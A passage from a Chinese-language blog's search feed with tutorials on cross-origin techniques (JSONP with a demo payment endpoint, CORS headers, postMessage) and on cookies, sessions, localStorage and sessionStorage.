class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">button.addEventListener(&apos;click&apos;, (e)=&gt;&#123;</span><br><span class="line">  let script = document.createElement(&apos;script&apos;)</span><br><span class="line">  let functionName = &apos;frank&apos;+ parseInt(Math.random()*10000000 ,10)</span><br><span class="line">  window[functionName] = function()&#123;  // 每次请求之前搞出一个随机的函数</span><br><span class="line">      amount.innerText = amount.innerText- 1</span><br><span class="line">  &#125;</span><br><span class="line">  script.src = &apos;/pay?callback=&apos; + functionName</span><br><span class="line">  document.body.appendChild(script)</span><br><span class="line">  script.onload = function(e)&#123; // 状态码是 200~299 则表示成功</span><br><span class="line">      e.currentTarget.remove()</span><br><span class="line">      delete window[functionName] // 请求完了就干掉这个随机函数</span><br><span class="line">  &#125;</span><br><span class="line">  script.onerror = function(e)&#123; // 状态码大于等于 400 则表示失败</span><br><span class="line">      e.currentTarget.remove()</span><br><span class="line">      delete window[functionName] // 请求完了就干掉这个随机函数</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>后端代码，不用看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">if (path === &apos;/pay&apos;)&#123;</span><br><span class="line">    let amount = fs.readFileSync(&apos;./db&apos;, &apos;utf8&apos;)</span><br><span class="line">    amount -= 1</span><br><span class="line">    fs.writeFileSync(&apos;./db&apos;, amount)</span><br><span class="line">    let callbackName = query.callback</span><br><span class="line">    response.setHeader(&apos;Content-Type&apos;, &apos;application/javascript&apos;)</span><br><span class="line">    response.write(`</span><br><span class="line">        $&#123;callbackName&#125;.call(undefined, &apos;success&apos;)</span><br><span class="line">    `)</span><br><span class="line">    response.end()</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><h3 id="为什么不支持POST"><a href="#为什么不支持POST" class="headerlink" title="为什么不支持POST"></a>为什么不支持POST</h3><p>因为JSONP是通过动态创建script标签实现的（script中的src属性只能写入url，而url可以写入get数据无法写入post），而动态创建script只能用GET不能用POST。</p><h3 id="jQuery的写法"><a href="#jQuery的写法" class="headerlink" title="jQuery的写法"></a>jQuery的写法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(Button).on(&apos;click&apos;, function () &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &quot;http://jack.com:8002/pay&quot;,</span><br><span class="line">        dataType: &quot;jsonp&quot;,</span><br><span class="line">        success: function (response) &#123;</span><br><span class="line">            if (response === &apos;success&apos;) &#123;</span><br><span class="line">                // alert(&apos;前端写的代码&apos;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: function () &#123;</span><br><span class="line">            alert(&apos;fail&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h2><p>跨源资源分享（Cross-Origin Resource Sharing），是一种ajax跨域请求资源的方式。实现方式很简单，当你使用XMLHttpRequest发送请求时，浏览器发现该请求不符合同源策略，会给该请求加一个请求头：Origin，后台进行一系列处理，如果确定接受请求则在返回结果中加入一个响应头：Access-Control-Allow-Origin; 浏览器判断该相应头中是否包含 Origin 的值，如果有则浏览器会处理响应，我们就可以拿到响应数据，如果不包含浏览器直接驳回，这时我们无法拿到响应数据。所以 CORS 的表象是让你觉得它与同源的 ajax 请求没啥区别，代码完全一样。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.setHeader(&apos;Access-Control-Allow-Origin&apos;,&apos;http://jayce.com:8003&apos;)</span><br><span class="line">response.setHeader(&apos;Access-Control-Allow-Origin&apos;,&apos;*&apos;)  // *代表允许所有浏览器访问</span><br></pre></td></tr></table></figure></p><h2 id="postMessage"><a href="#postMessage" class="headerlink" title="postMessage"></a>postMessage</h2><p>语法：otherWindow.postMessage(message, targetOrigin);</p><ul><li><p>otherWindow:指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口</p></li><li><p>message: 是要发送的消息，类型为 String、Object</p></li><li><p>targetOrigin: 是限定消息接收范围，可以是*（无限制）或者一个URL</p></li></ul><p>例如父窗口 <a href="http://aaa.com" target="_blank" rel="noopener">http://aaa.com</a> 向子窗口 <a href="http://bbb.com" target="_blank" rel="noopener">http://bbb.com</a> 发送消息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var popup = window.open(&apos;http://bbb.com&apos;, &apos;title&apos;);</span><br><span class="line">popup.postMessage(&apos;Hello World!&apos;, &apos;http://bbb.com&apos;);</span><br></pre></td></tr></table></figure></p><p>子窗口向父窗口发送消息也是类似<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.opener.postMessage(&apos;Nice to see you&apos;, &apos;http://aaa.com&apos;);</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>cookie、session及localStorge</title>
      <link href="/2018/08/01/cookie%E3%80%81session%E5%8F%8AlocalStorge/"/>
      <url>/2018/08/01/cookie%E3%80%81session%E5%8F%8AlocalStorge/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>说说cookie和localStorage的区别吧！这个几乎每次面试都会被提一嘴的问题<br><a id="more"></a></p><h1 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h1><h2 id="1、什么是cookie"><a href="#1、什么是cookie" class="headerlink" title="1、什么是cookie"></a>1、什么是cookie</h2><p>cookie是服务器发送到用户浏览器并保存在本地的一小块数据，用来记录某些当页面关闭或刷新后仍需记录的信息，它会在下一次浏览器向同一服务器发送请求时携带并发送给该服务器，在控制台用 document.cookie 可以查看当前正在浏览的网站cookie</p><p>要点：</p><ul><li>服务器通过 set-cookie 头给客户端一串字符串</li><li>浏览器每次访问相同域名的页面时必须带上 cookie 作为请求头（Request-Header）</li><li>cookie一般用来记录用户信息，默认在关闭页面后失效，后台代码可以设置cookie的过期时间</li></ul><h2 id="2、cookie用例"><a href="#2、cookie用例" class="headerlink" title="2、cookie用例"></a>2、cookie用例</h2><p>以注册登录为例：<br>1、注册账号时，服务器把你的用户名和密码存入数据库</p><p>2、登陆的时候，浏览器发送post请求，服务器把你的账号密码跟数据库里的做匹配，若匹配成功，则发送一个响应头给浏览器，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: sign_in_email=xxx@xxx.com</span><br></pre></td></tr></table></figure></p><p>3、这就是cookie，里面记录着你的登陆信息，浏览器会在一段时间内保存cookie</p><p>4、当你再访问相同域名的网页时，浏览器会带着这个cookie发请求，服务器会将cookie里的信息和数据库匹配，若匹配上了，则直接发送给你已经登陆上的页面</p><p>5、cookie默认在关闭页面后被清除，而后台可以设置cookie的过期时间</p><h2 id="3、Cookie的分类"><a href="#3、Cookie的分类" class="headerlink" title="3、Cookie的分类"></a>3、Cookie的分类</h2><p>浏览器所持有的cookie分为两种：</p><ul><li>Session Cookie（会话期即非持久Cookie）：是最简单的cookie，它不需要指定过期时间（expires）或是有效期（Max-Age），它仅在会话期内有效，浏览器关闭后它会被自动删除</li><li>Permanent Cookie（持久性Cookie）：可以指定过期时间或有效期</li></ul><p>设置cookie过期时间：</p><ul><li><p>setMaxAge</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie.setMaxAge(60*60)  // 过期时间为1小时</span><br></pre></td></tr></table></figure></li><li><p>expires(不要用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: name=Nicholas; expires=Sat, 02 May 2009 23:38:25 GMT  //星期六 5月2号 2009年 23:38:25时过期</span><br></pre></td></tr></table></figure></li></ul><p>因为expires设置是根据本地时间，但各个地方时区不同设置时容易造成混乱</p><h2 id="4、Cookie的作用："><a href="#4、Cookie的作用：" class="headerlink" title="4、Cookie的作用："></a>4、Cookie的作用：</h2><ul><li>保存用户登录状态：例如将用户ID储存在一个cookie内，这样用户在下次访问该页面的时候就不需要重新登录了，常见于很多论坛或社区，还可以设置过期时间，当超过这个期限，cookie会自动消失。因此，系统往往可以提示用户保持登录状态的时间，常见的有一个月、三个月、一年等</li><li>跟踪用户行为：例如一个天气预报网站，能根据用户选择的地区显示当地天气情况，但如果每次都需要用户选择所在地十分不人性化，当利用了cookie系统就能记住上一次访问的地区，当下次打开页面时，就会自动显示上次用户所在地区的天气情况</li><li>定制页面：如果网站提供了换肤或者更换布局的功能，使用cookie就可以记录下用户的选项，当用户下次访问时，仍然保持的是上一次设置的页面风格</li></ul><h1 id="cookie和session的区别"><a href="#cookie和session的区别" class="headerlink" title="cookie和session的区别"></a>cookie和session的区别</h1><p>HTTP是一个无状态协议，因此cookie最大的作用就是存储sessionID，用来唯一标识用户</p><p>cookie：</p><ul><li>它是由服务器通过Set-Cookie发送给浏览器的一串字符串构成</li><li>cookie被保存在客户端，并且每次都会随请求发送给服务器</li><li>没有session之前，cookie里记录了用户信息，任何人可读可写，十分不安全</li></ul><p>session：</p><ul><li>session是依附于cookie而存在的</li><li>服务器通过 session 给用户一个 sessionID ，sessionID 对应服务器中的一小块内存（一般是一个随机数），通过 set-cookie 添加到http响应头部中</li><li>浏览器发送请求时会带上cookie，服务器通过sessionID来识别用户</li><li>这样暴露给其他人的只有一个随机数sessionID，增加安全性</li></ul><h1 id="localStorage和sessionStorage"><a href="#localStorage和sessionStorage" class="headerlink" title="localStorage和sessionStorage"></a>localStorage和sessionStorage</h1><p>localStorage</p><p>localStorage是html5提供的一个本地存储web storage特性的API，实质上是一个哈希，有setItem、getItem、clear等属性</p><ul><li>localStorage 与 http 无关，HTTP不会带上localStorage的值</li><li>只有相同域名的页面才能互相读取 localStorage</li><li>经常在记录某个信息有没有提示给用户时用到</li><li>localStorage 永久有效，除非用户清理缓存</li></ul><p>sessionStorage 与 localStorage 唯一一点区别是，sessionStorage 在用户关闭页面后就会失效</p><h1 id="localStorage与cookie的区别"><a href="#localStorage与cookie的区别" class="headerlink" title="localStorage与cookie的区别"></a>localStorage与cookie的区别</h1><ul><li>cookie会随请求被发送到服务器上，但localStorage不会</li><li>cookie大小一般在4k左右，localStorage一般5MB左右（服务器不同也会有所不同）</li></ul>]]></content>
      
      
        <tags>
            
            <tag> cookie </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
